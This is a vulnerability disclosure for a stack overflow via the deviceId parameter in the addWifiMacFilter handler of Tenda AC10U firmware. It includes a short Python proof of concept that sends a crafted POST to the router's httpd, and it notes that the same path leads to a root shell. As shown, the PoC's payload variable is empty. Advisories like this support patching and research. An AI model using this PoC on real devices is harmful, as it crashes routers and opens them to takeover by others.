# Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 were discovered to contain a stack overflow via the deviceId parameter in the addWifiMacFilter function.

> vendor: Tenda

## Vulnerability Description

Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 were discovered to contain a stack overflow via the deviceId parameter in the addWifiMacFilter function.

## Vulnerability Details

![1](https://github.com/aixiao0621/Tenda/blob/main/AC10U/7/1.png)

In function addWifiMacFilter line 37, it reads in a user-provided parameter, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

## Recurring vulnerabilities and POC

```python
import requests

host = "192.168.59.136"
cyclic = b""

def exploit_addWifiMacFilter():
    url = f"http://{host}/goform/addWifiMacFilter"
    data = {
        b'deviceId':cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

exploit_addWifiMacFilter()
```

Run poc and you will see process httpd crash, segmentation fault. And you can write your own exp to get the root shell.
